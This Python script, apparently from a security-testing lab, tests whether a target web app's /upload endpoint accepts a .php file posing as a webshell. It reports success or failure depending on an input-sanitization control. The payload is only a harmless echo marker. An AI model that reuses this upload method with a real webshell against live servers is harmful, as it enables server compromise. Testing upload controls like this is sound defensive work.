"""
Unrestricted File Upload Attack
=================================
Simulates uploading a malicious non-image file (e.g. .php webshell) to /upload.

Behaviour with controls:
    ✅ INPUT_SANITIZATION ON  → only .png/.jpg/.jpeg accepted, upload blocked
    ❌ INPUT_SANITIZATION OFF → any file type accepted, malicious file saved to server

Output:
    {
        "attack": "file_upload",
        "attack_type": "Unrestricted File Upload",
        "success": true/false,
        "tte": <seconds>,
        "attempts": 1,
        "details": "..."
    }
"""

import time
import io
import requests

from config import TARGET_URL

# Simulated webshell payload (harmless marker — no real execution)
MALICIOUS_FILENAME = "shell.php"
MALICIOUS_CONTENT = b"<?php echo 'SCEL_SHELL_UPLOADED'; ?>"


def run_file_upload(verbose: bool = True) -> dict:
    """
    Attempt to upload a .php file to /upload.

    Returns:
        dict with keys: attack, attack_type, success, tte, attempts, details
    """
    upload_url = f"{TARGET_URL}/upload"
    start_time = time.time()

    if verbose:
        print(f"\n{'='*60}")
        print(f"  📂 FILE UPLOAD ATTACK")
        print(f"  Target   : {upload_url}")
        print(f"  Filename : {MALICIOUS_FILENAME}")
        print(f"{'='*60}\n")

    try:
        resp = requests.post(
            upload_url,
            files={"file": (MALICIOUS_FILENAME, io.BytesIO(MALICIOUS_CONTENT), "application/x-php")},
            timeout=10,
        )
    except requests.ConnectionError:
        elapsed = round(time.time() - start_time, 4)
        details = "Connection refused — is the target webapp running?"
        if verbose:
            print(f"  ❌ {details}")
        return {
            "attack": "file_upload",
            "attack_type": "Unrestricted File Upload",
            "success": False,
            "tte": elapsed,
            "attempts": 1,
            "details": details,
        }

    elapsed = round(time.time() - start_time, 4)
    body = resp.text

    if "File Uploaded Successfully" in body:
        success = True
        details = f"Malicious file '{MALICIOUS_FILENAME}' accepted and saved by server"
        if verbose:
            print(f"  💥 UPLOAD SUCCESS — server accepted malicious file")
    elif "Only image files allowed" in body:
        success = False
        details = "Blocked by input sanitization — non-image file rejected"
        if verbose:
            print(f"  🛡️  Blocked by input sanitization")
    else:
        success = False
        details = f"Unexpected response. Status={resp.status_code}. Body={body[:200]!r}"
        if verbose:
            print(f"  ❓ Unexpected response: {details}")

    result = {
        "attack": "file_upload",
        "attack_type": "Unrestricted File Upload",
        "success": success,
        "tte": elapsed,
        "attempts": 1,
        "details": details,
    }

    if verbose:
        print(f"\n{'─'*60}")
        print(f"  Result  : {'✅ SUCCESS' if success else '❌ FAILED'}")
        print(f"  TTE     : {elapsed}s")
        print(f"  Details : {details}")
        print(f"{'─'*60}\n")

    return result


# ─── Standalone execution ────────────────────────────────────────────────────
if __name__ == "__main__":
    result = run_file_upload()
    print("\nRaw result:")
    import json
    print(json.dumps(result, indent=2))
